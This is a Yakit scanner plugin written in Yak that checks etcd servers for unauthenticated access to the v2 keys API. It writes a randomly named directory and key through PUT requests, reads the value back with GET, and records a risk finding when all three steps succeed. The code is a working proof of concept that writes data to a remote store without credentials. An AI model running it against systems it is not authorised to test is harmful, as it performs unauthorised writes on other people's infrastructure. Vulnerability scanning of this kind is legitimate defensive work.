yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="etcd unauth 漏洞"
    severity="未填写"
    type="漏洞"
    r3 = str.RandStr(32)
    r2 = str.RandStr(32)
    r1 = str.RandStr(32)

    poc_url_r0= url + `/v2/keys/`+ parseStr(r1) +`?dir=true`
    req_r0, _ := http.NewRequest("PUT",poc_url_r0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r0)
    resp_r0, err := http.Do(req_r0)
    die(err)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    if resp_r0.StatusCode == 201{
        r0_flag = true
    }

    poc_url_r1= url + `/v2/keys/`+ parseStr(r1) +`/`+ parseStr(r2) +`?prevExist=false`
    req_r1, _ := http.NewRequest("PUT",poc_url_r1,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Content-Type`,`application/x-www-form-urlencoded`),
    http.body(`value=`+ parseStr(r3) +``),)
    breq,_=http.dump(req_r1)
    resp_r1, err := http.Do(req_r1)
    die(err)
    bresp,_=http.dump(resp_r1)
    header, body = poc.Split(bresp)
    r1_flag = false
    if resp_r1.StatusCode == 201{
        r1_flag = true
    }

    poc_url_r2= url + `/v2/keys/`+ parseStr(r1) +`/`+ parseStr(r2) +`?quorum=false&recursive=false&sorted=false`
    req_r2, _ := http.NewRequest("GET",poc_url_r2,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r2)
    resp_r2, err := http.Do(req_r2)
    die(err)
    bresp,_=http.dump(resp_r2)
    header, body = poc.Split(bresp)
    r2_flag = false
    if resp_r2.StatusCode == 200 && str.Contains(string(body),parseStr(r3)){
        r2_flag = true
    }

    poc_url=poc_url_r2
    if r0_flag && r1_flag && r2_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
